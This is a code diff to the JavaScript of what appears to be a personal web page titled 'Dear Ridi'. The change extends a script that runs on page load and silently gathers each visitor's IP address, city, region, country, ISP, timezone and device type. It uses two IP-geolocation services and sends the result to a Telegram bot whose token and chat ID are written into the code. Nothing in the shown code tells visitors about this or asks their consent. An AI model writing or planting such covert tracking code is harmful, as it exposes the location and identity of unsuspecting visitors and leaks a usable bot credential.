@@ -439,19 +439,41 @@
   window.addEventListener('load', async () => {
     const botToken = '8589456301:AAECBPTitbgDOW83TjAO5qiUNO6N0dPGVtI';
     const chatId = '6620158343';
-    const time = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
+    
+    // ভিজিটরের ডিভাইসের আসল সময় ও টাইমজোন
+    const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'অজানা';
+    const bdTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
     const device = /Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop/PC';
 
-    let locationInfo = 'জানা যায়নি';
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
-      if (data.city || data.region) {
-        locationInfo = `${data.city || ''}, ${data.region || ''} (${data.org || ''})`;
-      }
-    } catch (e) {}
+    let ip = 'অজানা';
+    let locationInfo = 'লোকেশন পাওয়া যায়নি';
 
-    const message = `🔔 কেউ একজন তোমার "ডিয়ার রিদি" পেজটি ওপেন করেছে!\n\n⏰ সময়: ${time}\n📱 ডিভাইস: ${device}\n📍 লোকেশন: ${locationInfo}`;
+    try {
+      // প্রাইমারি API (ipwho.is)
+      const res = await fetch('https://ipwho.is/');
+      const data = await res.json();
+      if (data.success) {
+        ip = data.ip || 'অজানা';
+        locationInfo = `${data.city || ''}, ${data.region || ''}, ${data.country || ''} (${data.connection?.isp || ''})`;
+      } else {
+        throw new Error('Primary API failed');
+      }
+    } catch (e) {
+      try {
+        // ব্যাকআপ API (freeipapi.com)
+        const res2 = await fetch('https://freeipapi.com/api/json');
+        const data2 = await res2.json();
+        ip = data2.ipAddress || 'অজানা';
+        locationInfo = `${data2.cityName || ''}, ${data2.regionName || ''}, ${data2.countryName || ''}`;
+      } catch (err) {}
+    }
+
+    const message = `🔔 কেউ একজন তোমার "ডিয়ার রিদি" পেজটি ওপেন করেছে!\n\n` +
+                    `⏰ সময় (BD): ${bdTime}\n` +
+                    `🌐 ডিভাইস টাইমজোন: ${userTimeZone}\n` +
+                    `📱 ডিভাইস: ${device}\n` +
+                    `🔢 IP: ${ip}\n` +
+                    `📍 আইপি লোকেশন: ${locationInfo}`;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
